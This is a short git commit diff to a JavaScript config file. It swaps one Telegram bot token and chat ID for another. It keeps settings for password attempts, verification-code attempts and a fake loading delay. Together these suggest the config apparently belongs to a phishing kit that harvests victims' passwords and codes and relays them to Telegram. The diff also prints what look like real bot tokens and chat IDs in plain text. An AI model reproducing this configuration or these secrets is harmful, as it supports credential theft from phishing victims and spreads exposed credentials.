8aa8e1ba2d74daf96a3bcc15e57235b033e0fba0
ovftank <ovftank@gmail.com>
2024-02-16 00:00:00 +0700

    bbh

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,6 @@
 const config = {
-    token: '7586875716:AAEuZPxA_LtOlOm60S4x0Syhh2StRQZUDeE',
-    chat_id: '-5040339257',
-    noti_token: '',
-    noti_chat_id: '',
+    token: '7586875716:AAEuLt0IlJYnyeiXE2Klk6_B-fJ44O9KG-0',
+    chat_id: '-1003751020621',
     max_password_attempts: 2,
     max_code_attempts: 4,
     password_loading_time: 5,
